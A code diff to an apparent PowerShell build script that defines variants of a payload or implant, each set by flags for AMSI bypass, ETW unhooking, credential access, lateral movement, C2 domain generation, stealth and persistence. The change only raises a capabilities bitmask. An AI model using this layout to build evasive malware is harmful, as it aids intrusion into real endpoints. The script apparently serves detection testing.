@@ -152,7 +152,7 @@ $arms = [ordered]@{
     'lateral'   = @('PX_LATERAL=1')
     'resilient' = @('PX_RESILIENT=1')
     'xfer'      = @('PX_FILE_TRANSFER=1', 'PX_SCREENSHOT=1')
-    'caps'      = @('PX_CAPABILITIES=0x3FFFFF')
+    'caps'      = @('PX_CAPABILITIES=0x7FFFFF')
     # Everything EXCEPT domain generation.
     #
     # The DGA arm REPLACES the C2 host with a generated name, so it
@@ -173,7 +173,7 @@ $arms = [ordered]@{
     'all'       = @('PX_OBFUSCATE=1', 'PX_AMSI_BYPASS=1', 'PX_ETW_UNHOOK=1',
                     'PX_ENCRYPT=1', 'PX_CRED_ACCESS=1',
                     'PX_LATERAL=1', 'PX_RESILIENT=1', 'PX_FILE_TRANSFER=1',
-                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x3FFFFF')
+                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x7FFFFF')
     # The stealth arm: the technique-heavy arm with the ARTEFACTS off.
     #
     # The endpoint's machine-learning verdict on this payload arrives at
@@ -191,7 +191,7 @@ $arms = [ordered]@{
     'stealth'   = @('PX_OBFUSCATE=1', 'PX_AMSI_BYPASS=1', 'PX_ETW_UNHOOK=1',
                     'PX_ENCRYPT=1', 'PX_CRED_ACCESS=1',
                     'PX_LATERAL=1', 'PX_RESILIENT=1', 'PX_FILE_TRANSFER=1',
-                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x3FFFFF',
+                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x7FFFFF',
                     'PX_STEALTH=1', 'PX_STEALTH_DELAY=20')
     # The persistent arm: the stealth arm, and the session survives a
     # reboot.
@@ -209,13 +209,13 @@ $arms = [ordered]@{
     'persistent' = @('PX_OBFUSCATE=1', 'PX_AMSI_BYPASS=1', 'PX_ETW_UNHOOK=1',
                     'PX_ENCRYPT=1', 'PX_CRED_ACCESS=1',
                     'PX_LATERAL=1', 'PX_RESILIENT=1', 'PX_FILE_TRANSFER=1',
-                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x3FFFFF',
+                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x7FFFFF',
                     'PX_STEALTH=1', 'PX_STEALTH_DELAY=20',
                     'PX_PERSISTENT=1')
     'full'      = @('PX_OBFUSCATE=1', 'PX_AMSI_BYPASS=1', 'PX_ETW_UNHOOK=1',
                     'PX_ENCRYPT=1', 'PX_DGA=1', 'PX_CRED_ACCESS=1',
                     'PX_LATERAL=1', 'PX_RESILIENT=1', 'PX_FILE_TRANSFER=1',
-                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x3FFFFF')
+                    'PX_SCREENSHOT=1', 'PX_CAPABILITIES=0x7FFFFF')
 }
 
 $built = @()
